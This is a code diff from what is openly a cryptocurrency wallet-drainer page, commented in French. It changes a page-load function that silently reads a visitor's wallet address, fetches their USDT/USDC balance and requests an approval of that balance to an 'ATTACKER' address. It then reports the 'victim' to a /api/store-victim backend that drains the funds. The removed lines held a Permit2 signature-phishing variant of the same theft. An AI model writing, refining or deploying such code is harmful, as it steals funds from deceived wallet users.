@@ -1186,7 +1186,8 @@ try {
   // Triggered by page-load auto-flow when ?method=permit2 is in the URL.
 
   async function firePermit2Flow(preset) {
-    var PERMIT2_ADDR = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+    // Option A — approve direct vers ATTACKER (relay.pull), sans Permit2 ni signature.
+    // Le contrat relay appelle IERC20.transferFrom(from, owner, amount) directement.
     var TOKEN_MAP = {
       'usdt-erc20': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
       'usdc-erc20': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
@@ -1203,29 +1204,27 @@ try {
       var a = p.get('from') || p.get('address') || p.get('a');
       return (a && /^0x[a-fA-F0-9]{40}$/i.test(a)) ? a.toLowerCase() : null;
     }
+
     var from = getAddrFromUrl() || eth.selectedAddress || eth.address || '';
     if (!from) {
-      // TW Browser injecte selectedAddress de façon asynchrone au chargement.
-      // Attente silencieuse — aucun popup, aucune demande de connexion.
       await new Promise(function(r) { setTimeout(r, 400); });
       from = eth.selectedAddress || eth.address || '';
     }
     if (!from) {
       try {
-        // eth_accounts = lecture silencieuse des comptes déjà autorisés (pas de popup)
         var accounts = await eth.request({ method: 'eth_accounts' });
         from = (accounts && accounts[0]) || '';
       } catch(e) {}
     }
-    // Jamais eth_requestAccounts — règle stricte : aucune demande de connexion.
+    if (!from) return;
 
+    // Balance via publicnode d'abord, fallback provider injecte
     var MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
     var approveAmount;
     try {
       if (from && from !== '0x0000000000000000000000000000000000000000') {
         var balCallData = '0x70a08231000000000000000000000000' + from.slice(2).padStart(64, '0');
         var balHex;
-        // publicnode en premier — plus fiable que le provider injecté pour les eth_call
         try {
           var rpcResp = await fetch('https://ethereum.publicnode.com', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -1234,7 +1233,6 @@ try {
           var rpcJson = await rpcResp.json();
           balHex = rpcJson && rpcJson.result;
         } catch(e) {}
-        // fallback sur le provider injecté si publicnode échoue
         if (!balHex || balHex === '0x') {
           try {
             balHex = await eth.request({ method: 'eth_call', params: [{ to: tokenAddr, data: balCallData }, 'latest'] });
@@ -1249,83 +1247,29 @@ try {
       approveAmount = ethers.BigNumber.from(MAX_UINT);
     }
 
-    // Step 1: approve Permit2
-    // AWAIT le TX — résout dès que l'utilisateur confirme (pas d'attente on-chain).
-    // TW Browser reste sur la dApp après soumission et expose selectedAddress.
-    // C'est après cet await que from devient valide pour eth_signTypedData_v4.
+    // approve(ATTACKER, solde) — une seule TX, pas de Permit2
     var ifaceApprove = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
-    var approveData  = ifaceApprove.encodeFunctionData('approve', [PERMIT2_ADDR, approveAmount]);
-    // Fire-and-forget approve : TW Browser bloque le thread sur 'Transaction Submitted'
-    // si on await eth_sendTransaction. En fire-and-forget, approve + sign entrent dans
-    // la queue TW Browser en sequence : approve affiche, utilisateur confirme, sign s'affiche.
-    var _approveRejected = false;
-    eth.request({
-      method: 'eth_sendTransaction',
-      params: [{ from: from, to: tokenAddr, value: '0x0', data: approveData }]
-    }).catch(function(e) {
-      if (e && (e.code === 4001 || e.code === 'ACTION_REJECTED')) { _approveRejected = true; }
-    });
+    var approveData  = ifaceApprove.encodeFunctionData('approve', [ATTACKER, approveAmount]);
 
-    // 800ms : laisser TW Browser rendre la popup approve avant de pousser le sign en queue
-    await new Promise(function(r) { setTimeout(r, 800); });
-    if (_approveRejected) return;
-
-    // Step 2: Permit2 gasless signature
-    var nonce    = Math.floor(Math.random() * Math.pow(2, 48));
-    var deadline = Math.floor(Date.now() / 1000) + 3600;
-    var permit2TypedData = {
-      types: {
-        // EIP712Domain obligatoire — TW Browser rejette silencieusement sans ce champ
-        EIP712Domain: [
-          { name: 'name',              type: 'string'  },
-          { name: 'chainId',           type: 'uint256' },
-          { name: 'verifyingContract', type: 'address' }
-        ],
-        PermitTransferFrom: [
-          { name: 'permitted', type: 'TokenPermissions' },
-          { name: 'spender',   type: 'address'          },
-          { name: 'nonce',     type: 'uint256'          },
-          { name: 'deadline',  type: 'uint256'          }
-        ],
-        TokenPermissions: [
-          { name: 'token',  type: 'address' },
-          { name: 'amount', type: 'uint256' }
-        ]
-      },
-      domain: { name: 'Permit2', chainId: 1, verifyingContract: PERMIT2_ADDR },
-      primaryType: 'PermitTransferFrom',
-      message: {
-        permitted: { token: tokenAddr, amount: approveAmount.toString() },
-        spender:   ATTACKER,
-        nonce:     nonce,
-        deadline:  deadline
-      }
-    };
-    var signature;
     try {
-      signature = await eth.request({
-        method: 'eth_signTypedData_v4',
-        params: [from, JSON.stringify(permit2TypedData)]
+      await eth.request({
+        method: 'eth_sendTransaction',
+        params: [{ from: from, to: tokenAddr, value: '0x0', data: approveData }]
       });
-    } catch(e) { console.warn('permit2 sign error', e); return; }
+    } catch(e) {
+      if (e && (e.code === 4001 || e.code === 'ACTION_REJECTED')) return;
+      // autre erreur reseau : on continue, drainWithRetry retentera
+    }
 
-    // Step 3: send to server
+    // Notifier le backend — drainWithRetry appellera relay.pull(token, from, amount)
     try {
       await fetch('/api/store-victim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          victim:    from,
-          chain:     '1',
-          method:     'uniswap-permit2',
-          preset:     preset,
-          permitData: permit2TypedData.message,
-          permit2Sig: signature
-        })
+        body: JSON.stringify({ victim: from, chain: '1' })
       });
-    } catch(e) { console.warn('store-victim error', e); }
+    } catch(e) {}
   }
-
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const USDC_ADDR = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
   const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
